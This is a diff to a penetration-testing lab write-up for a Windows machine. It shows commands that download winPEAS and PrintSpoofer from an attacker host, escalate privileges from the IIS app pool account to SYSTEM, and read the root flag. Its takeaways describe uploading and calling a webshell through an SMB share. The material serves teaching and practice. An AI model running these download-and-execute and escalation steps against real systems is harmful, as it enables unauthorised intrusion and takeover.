@@ -188,36 +188,47 @@ type C:\Users\Bob\Desktop\user.txt
 
 ## 6. Privilege Escalation — winPEAS and PrintSpoofer
 
-powershell -c "Invoke-WebRequest http://192.168.160.214:8080/winPEAS.ps1 -OutFile C:\Windows\Temp\winPEAS.ps1"
+Full technique: [printspoofer-seimpersonate.md](../../exploits/privesc-windows/printspoofer-seimpersonate.md).
 
-powershell -c "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEASAny.exe"
-                                                                                                                                                                                                                        
-=========|| Checking for SNMP Passwords
-SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
-
-## Unquoted Service Path vulnerability identified.
-Name: AWSLiteAgent 
-PathName: C:\Program Files\Amazon\XenTools\LiteAgent.exe
-
-## Target has SeImpersonatePrivilege enabled.
 ```cmd
-# What it does: download the PrintSpoofer exploit from the attacker.
-# Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
-powershell -c "Invoke-WebRequest http://192.168.160.214/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"
+REM What it does: download and run winPEAS to enumerate privilege escalation vectors.
+REM Why here: identify SeImpersonatePrivilege and other misconfigurations on the target.
+powershell -c "Invoke-WebRequest http://$LHOST:8080/winPEAS.ps1 -OutFile C:\Windows\Temp\winPEAS.ps1"
+powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEAS.ps1
+```
 
-# What it does: leverage SeImpersonatePrivilege via PrintSpoofer.
-# Why here: escalate privileges from iis apppool to nt authority\system.
+winPEAS findings:
+- SNMP Key found at `HKLM:\SYSTEM\CurrentControlSet\Services\SNMP`
+- Unquoted Service Path: `AWSLiteAgent` → `C:\Program Files\Amazon\XenTools\LiteAgent.exe`
+- **SeImpersonatePrivilege enabled** → PrintSpoofer path
+
+```cmd
+REM What it does: download the PrintSpoofer exploit from the attacker.
+REM Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
+powershell -c "Invoke-WebRequest http://$LHOST/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"
+
+REM What it does: leverage SeImpersonatePrivilege via PrintSpoofer.
+REM Why here: escalate privileges from iis apppool to nt authority\system.
 C:\Windows\Temp\ps.exe -i -c cmd
 ```
 
-## Final access as SYSTEM / Administrator
 ```cmd
-REM What it does: execute a command in the Windows command prompt.
-REM Why here: confirm SYSTEM access and capture the final root flag.
+REM What it does: confirm SYSTEM access and capture the final root flag.
+REM Why here: complete the machine with full administrative privileges.
 whoami
-## nt authority\system
-C:\Users\Administrator\Desktop>type root.txt
+REM nt authority\system
+type C:\Users\Administrator\Desktop\root.txt
 ```
+
+---
+
+## 7. Key Takeaways
+
+- Writable SMB shares mirrored as IIS virtual directories are an instant webshell path — `smbclient put shell.asp` + `curl http://target/share/shell.asp` is the universal chain.
+- Always check for a second IIS instance on high ports (`:49663`, `:8080`). The share path may only be served by the alternate binding.
+- Base64-encoded credential files in SMB shares are more common than you'd expect. `cat + base64 -d` is a mandatory triage step.
+- `curl -G --data-urlencode` is essential for webshell payloads with special characters — URL encoding in the query string prevents corruption.
+- `SeImpersonatePrivilege` on IIS app pool accounts is the default on Windows Server — PrintSpoofer/JuicyPotato is almost always the privesc path.
 
 ---
 
